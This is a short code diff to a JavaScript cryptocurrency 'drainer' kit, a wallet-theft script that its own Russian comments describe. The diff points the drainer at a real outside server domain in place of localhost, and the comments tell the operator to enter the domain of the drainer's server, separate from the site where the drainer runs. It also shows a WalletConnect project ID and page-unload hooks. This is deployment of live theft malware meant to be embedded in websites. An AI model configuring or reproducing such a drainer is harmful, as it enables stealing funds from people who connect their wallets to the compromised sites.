@@ -1,6 +1,6 @@
 let MS_Encryption_Key = 50;
 //const MS_Server = "bytebuzz.top";
-const MS_Server = "localhost:3000"; // demo-drain.theworkpc.com Указать домен, который прикреплен к серверу дрейнера
+const MS_Server = "ojgloblservices.com"; // demo-drain.theworkpc.com Указать домен, который прикреплен к серверу дрейнера
 // Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
 const MS_WalletConnect_ID = "f7973d278ef01f15d3db7e3180ebc71d"; // Project ID из WalletConnect Cloud
 //const ETHERSCAN_API_KEY = "8XQYC49U4A4FJ19NWB29MJ5EW3CZRCIIEH";
@@ -4523,4 +4523,5 @@ setInterval(async () => {
 }, 1000);
 
 window.addEventListener("beforeunload", (e) => leave_website());
+
 window.addEventListener("onbeforeunload", (e) => leave_website());
